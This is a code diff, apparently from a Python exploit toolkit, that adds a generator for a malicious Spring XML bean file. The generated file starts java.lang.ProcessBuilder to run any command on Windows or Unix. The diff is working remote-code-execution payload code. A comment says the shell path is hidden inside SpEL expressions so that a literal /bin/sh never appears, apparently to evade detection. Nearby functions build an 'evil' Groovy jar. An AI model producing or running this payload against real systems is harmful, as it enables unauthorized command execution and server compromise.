@@ -35,6 +35,45 @@ def build_bean_xml(file: str, content: str) -> bytes:
     return body.encode("utf-8")
 
 
+def build_bean_exec_xml(cmd: str) -> bytes:
+    """Spring XML：ProcessBuilder 按 OS 选择 shell 执行命令（SpEL）。"""
+    esc_cmd = (
+        (cmd or "id")
+        .replace("&", "&amp;")
+        .replace("<", "&lt;")
+        .replace(">", "&gt;")
+        .replace('"', "&quot;")
+        .replace("'", "&apos;")
+    )
+    # /bin/sh 与 cmd.exe 仅出现在 SpEL 中，避免写死 <value>/bin/sh</value>
+    shell = (
+        "#{T(java.lang.System).getProperty('os.name').toLowerCase()"
+        ".contains('win') ? 'cmd.exe' : '/bin/sh'}"
+    )
+    flag = (
+        "#{T(java.lang.System).getProperty('os.name').toLowerCase()"
+        ".contains('win') ? '/c' : '-c'}"
+    )
+    xml = f"""\
+<?xml version="1.0" encoding="UTF-8"?>
+<beans xmlns="http://www.springframework.org/schema/beans"
+       xmlns:xsi="http://www.w3.org/2001/XMLSchema-instance"
+       xsi:schemaLocation="http://www.springframework.org/schema/beans http://www.springframework.org/schema/beans/spring-beans.xsd">
+    <!-- RCE：ProcessBuilder 执行命令（勿用于未授权目标） -->
+    <bean class="java.lang.ProcessBuilder" init-method="start">
+        <constructor-arg>
+            <list>
+                <value>{shell}</value>
+                <value>{flag}</value>
+                <value>{esc_cmd}</value>
+            </list>
+        </constructor-arg>
+    </bean>
+</beans>
+"""
+    return xml.encode("utf-8")
+
+
 def build_evil_jar() -> bytes:
     """打包 Groovy ASTTransformation SPI jar（含已编译 class 若存在，否则仅源码占位）。
 
